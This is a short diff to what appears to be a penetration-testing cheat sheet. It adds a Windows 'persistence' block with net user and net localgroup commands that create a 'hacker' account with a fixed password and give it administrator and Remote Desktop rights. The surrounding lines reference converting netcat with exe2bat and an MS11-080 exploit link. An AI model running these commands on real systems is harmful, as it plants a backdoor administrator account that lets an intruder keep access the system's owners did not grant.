@@ -240,6 +240,16 @@ wine exe2bat.exe nc.exe nc.txt
 todo
 
 ## Privilege escalation - Windows
+
+
+Adding persistence:
+```
+net user hacker Hacker123! /add
+
+net localgroup administrators hacker /add
+
+net localgroup "Remote Desktop Users" hacker /add
+```
 ### Exploits
 * MS11-080 - Windows XP, Windows 2003 Adf.sys 
 	* http://www.exploit-db.com/exploits/18176/ MS11-080
